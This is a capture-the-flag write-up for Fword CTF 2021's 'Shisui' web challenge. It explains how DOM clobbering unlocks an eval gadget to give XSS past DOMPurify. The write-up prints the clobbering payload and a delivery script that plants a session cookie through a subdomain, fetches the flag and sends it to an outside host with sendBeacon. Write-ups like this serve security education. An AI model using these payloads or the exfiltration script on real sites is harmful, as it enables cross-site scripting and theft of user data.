---
title: Shisui - Fword CTF 2021
date: 2021-08-30
author: Yadhu Krishna M
author_url: https://twitter.com/YadhuKrishna_
categories:
 - Web Exploitation
tags:
 - FwordCTF
 - XSS
 - DOM Clobbering
---
 
**tl;dr**

+ XSS using DOM Clobbering 
+ `<a id="showInfos"></a><a id="SETTINGS" name=check data-timezone="aaa" data-location="eval(window.name)"><a id="SETTINGS" name="x">` 
+ Bypass CSRF protection to execute XSS and read flag.

<!--more-->

**No. Of Solves:** 5

**Challenge points:** 999

**Solved By:** [Az3z3l](https://twitter.com/Az3z3l), [Captain-Kay](https://twitter.com/captainkay11), [imp3ri0n](https://twitter.com/YadhuKrishna_), [1nt3rc3pt0r](https://twitter.com/_1nt3rc3pt0r_)

**Source Code:** [here](source-code.zip)

## Initial Analysis

We're given a web application that has a login and register page. Upon registering, the user is presented with a feedback page. 

![screenshot](1.png)

On inspecting the source code, one can see that the page uses latest version of DOMpurify and runs the below JavaScript code to display the comment.

```html=
<script>
	var url = new URL(document.location.href);
	var params = new URLSearchParams(url.search);
	var feedback=params.get("feedback");
	if (feedback){
		var clean = DOMPurify.sanitize(feedback,{FORBID_TAGS: ['style','form','input','meta']});		
		document.getElementById("out").innerHTML=clean;
	}
</script>
```


We are allowed to inject HTML but not JavaScript. We also have a `main.js` file with the following content. <br/>


```javascript=
window.SETTINGS = window.SETTINGS || [{
  dataset:{
    "timezone":"",
    "location":"Tunisia"
  },
  Title:"FwordFeedbacks",
  check: false	
}]
function looseJsonParse(obj){
  if(obj.length<35){  
	return eval("(" + obj + ")");
  }else{
    return {location:"Limit Length Exceeded"}
  }
}
function addInfos(){
	if(window.showInfos && SETTINGS.check  && SETTINGS[0].dataset.timezone.length>2){
        var infos=`{location:${SETTINGS[0].dataset.location}}`;
	var result=document.createElement("p");
	result.textContent=`Location: ${looseJsonParse(infos).location} Timezone: UTC+1` ;
	document.getElementById("out").appendChild(result);
	console.log(result);
	}
}
addInfos()

```

The initial lines of the above code along with the HTML Injection that we have, can cause DOM Clobbering attack. 

## Exploit

### Trigerring XSS

The `looseJsonParse` function can be used to trigger an XSS. However, it requires three conditions - `window.showInfos && SETTINGS.check  && SETTINGS[0].dataset.timezone.length>2`.

+ `window.showInfos` can be set by injecting `<a id="showInfos"></a>`.

+ The second condition can be bypassed by clobbering `window.SETTINGS`.

```html
<a id="SETTINGS" name=check><a id="SETTINGS" name="x">
```
![screenshot](2.png)

+ For the third condition, we require `SETTINGS[0].dataset.timezone.length>2`. This can be solved by setting data attribute to the HTML tag. (Read about dataset attribute [here](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset).)

```html
<a id="SETTINGS" name=check data-timezone="aaa"><a id="SETTINGS" name="x">
```

![screenshot](3.png)

Combining all the conditions, our payload becomes,

```html
<a id="showInfos"></a><a id="SETTINGS" name=check data-timezone="aaa" data-location="eval(window.name)"><a id="SETTINGS" name="x">
```

With the above payload, `window.name` will be executed by JavaScript. Now we can execute JavaScript by sending the admin to a page containing the below script. 

```javascript
window.open("http://host:5000/home?feedback=%3Ca+id%3D%22showInfos%22%3E%3C%2Fa%3E%3Ca+id%3D%22SETTINGS%22+name%3Dcheck+data-timezone%3D%22aaa%22+data-location%3D%22eval%28window.name%29%22%3E%3Ca+id%3D%22SETTINGS%22+name%3D%22x%22%3E&submit=Add+Feedback", "alert(1)")
```

Now, we have an authenticated XSS. But the admin bot does not authenticate on submitting a URL. 

### Delivering Exploit

Create a subdomain (say `challenge.example.org`) that has a CNAME record to `shisui.fword.tech` (challenge server). Then on the main domain, we set a cookie to authenticate the admin bot. 

The exploit script that runs on the main domain:

```html
<html>
<script>

    let ck = 'eyJj...OzGA'; // a valid session cookie

    document.cookie = `session=${ck};path=/;domain=challenge.example.org`; // Set cookie on subdomain
    let payload=`fetch("/flag").then(r=>r.text()).then(z=>navigator.sendBeacon("http://example.org", z))`, 
    url = "http://challenge.example.org/home?feedback=%3Ca+id%3D%22showInfos%22%3E%3C%2Fa%3E%3Ca+id%3D%22SETTINGS%22+name%3Dcheck+data-timezone%3D%22aaa%22+data-location%3D%22eval%28window.name%29%22%3E%3Ca+id%3D%22SETTINGS%22+name%3D%22x%22%3E&submit=Add+Feedback"; 
  
    window.open(url, name=payload); // Open the subdomain with exploit
</script>
</html>
```

## Flag

```
FwordCTF{UchiHa_ShiSui_Is_GoDLik3YoU}
```
